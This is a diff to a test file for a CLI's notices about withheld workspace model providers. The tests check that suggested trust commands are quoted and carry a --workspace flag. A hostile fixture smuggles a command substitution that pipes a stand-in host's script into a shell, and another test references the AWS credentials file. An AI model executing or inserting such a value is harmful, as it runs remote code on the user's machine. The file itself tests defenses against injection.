@@ -1,6 +1,6 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'fs';
-import { tmpdir } from 'os';
+import { homedir, tmpdir } from 'os';
 import { join } from 'path';
 import { collectWithheldProjectNotices } from './project-approval-notices.js';
 import { hookFingerprint } from './hook-approvals.js';
@@ -383,9 +383,84 @@ describe('collectWithheldProjectNotices: workspace providers', () => {
 
     expect(lines).toHaveLength(1);
     expect(lines[0]).toContain('evil');
-    expect(lines[0]).toContain('https://evil.example/v1');
-    expect(lines[0]).toContain('{env:EVIL_KEY}');
-    expect(lines[0]).toContain('`book trust provider evil`');
+    // The parsed origin, and the variable the reference names.
+    expect(lines[0]).toContain('(https://evil.example,');
+    expect(lines[0]).toContain('environment variable EVIL_KEY');
+    // The command carries --workspace: the notice is for a workspace that is not the cwd.
+    expect(lines[0]).toContain(`\`book trust provider evil --workspace ${workspace}\``);
+  });
+
+  // Finding 1: a provider id is any JSON key the repository writes.
+  it('never pastes an id a shell would interpret into the suggested command', () => {
+    const hostile = 'x $(curl evil.sh|sh)';
+    writeProject({ provider: { [hostile]: evil, 'my prov': evil } });
+
+    const lines = providerNotices();
+
+    expect(lines).toHaveLength(2);
+    const commands = lines.map((line) => /`(book trust[^`]*)`/.exec(line)![1]);
+    // A space is quoted; an id with `$` has no command that names it, so the listing is offered.
+    expect(commands).toContain(`book trust provider "my prov" --workspace ${workspace}`);
+    expect(commands).toContain(`book trust provider --workspace ${workspace}`);
+    for (const command of commands) {
+      expect(command).not.toContain('$(');
+      expect(command).not.toContain('curl');
+    }
+  });
+
+  it('quotes a workspace path with a space in the suggested command', () => {
+    writeProject({ provider: { evil } });
+    const spaced = `${workspace} with space`;
+    mkdirSync(join(spaced, '.book'), { recursive: true });
+    writeFileSync(join(spaced, '.book', 'settings.json'), JSON.stringify({ provider: { evil } }));
+    try {
+      const quoted = collectWithheldProjectNotices({
+        workspace: spaced,
+        settings: gated().settings,
+        settingsEnabled: false,
+        providerGate: resolveSettingsWithProviderGate(spaced, undefined, {
+          userSettingsPath: userPath(),
+          home,
+          trustStorePath: trustPath(),
+        }).providerGate,
+      });
+      expect(quoted[0]).toContain(`\`book trust provider evil --workspace "${spaced}"\``);
+    } finally {
+      rmSync(spaced, { recursive: true, force: true });
+    }
+  });
+
+  it('reports a workspace provider named like the legacy decision key as reserved', () => {
+    writeProject({ provider: { '.bookrc.json': evil } });
+
+    const lines = providerNotices();
+
+    expect(lines).toHaveLength(1);
+    expect(lines[0]).toContain('reserved');
+    expect(lines[0]).not.toContain('Run `');
+  });
+
+  // Finding 4: the user's own `meta-llama/…` model is not the workspace's provider.
+  it('says once that the user model sharing a prefix with a pending provider is unaffected', () => {
+    writeUser({ model: 'meta-llama/llama-3-70b' });
+    writeProject({ provider: { 'meta-llama': evil } });
+
+    const lines = providerNotices();
+
+    expect(lines).toHaveLength(2);
+    const unaffected = lines.find((line) => line.includes('is unaffected'));
+    expect(unaffected).toContain('provider "meta-llama" declared by the workspace is withheld');
+    expect(unaffected).toContain('your model "meta-llama/llama-3-70b"');
+  });
+
+  it('reports a dropped type override with the other dropped keys', () => {
+    writeUser({ provider: { work: { baseURL: 'https://user.example/v1' } } });
+    writeProject({ provider: { work: { type: 'anthropic' } } });
+
+    const lines = providerNotices();
+
+    expect(lines).toHaveLength(1);
+    expect(lines[0]).toContain('type for provider "work"');
   });
 
   it('never prints a literal key', () => {
@@ -411,7 +486,7 @@ describe('collectWithheldProjectNotices: workspace providers', () => {
 
     const lines = providerNotices();
     expect(lines).toHaveLength(1);
-    expect(lines[0]).toContain('{file:~/.aws/credentials}');
+    expect(lines[0]).toContain(`file ${join(homedir(), '.aws', 'credentials')}`);
   });
 
   it('reports a workspace override of a trusted provider as dropped, once per layer', () => {
@@ -440,7 +515,7 @@ describe('collectWithheldProjectNotices: workspace providers', () => {
 
     const model = lines.find((line) => line.includes('model "evil/x"'));
     expect(model).toContain('"trusted-model"');
-    expect(model).toContain('`book trust provider evil`');
+    expect(model).toContain(`\`book trust provider evil --workspace ${workspace}\``);
     const advisor = lines.find((line) => line.includes('advisorModel "evil/adv"'));
     expect(advisor).toBeDefined();
     expect(advisor).toContain('none');
@@ -465,7 +540,7 @@ describe('collectWithheldProjectNotices: workspace providers', () => {
     expect(lines).toHaveLength(1);
     expect(lines[0]).toContain('.bookrc.json');
     expect(lines[0]).toContain('https://legacy.example/v1');
-    expect(lines[0]).toContain('`book trust provider .bookrc.json`');
+    expect(lines[0]).toContain(`\`book trust provider .bookrc.json --workspace ${workspace}\``);
     expect(providerNotices(gate('approved'))).toEqual([]);
     expect(providerNotices(gate('rejected'))).toEqual([]);
   });
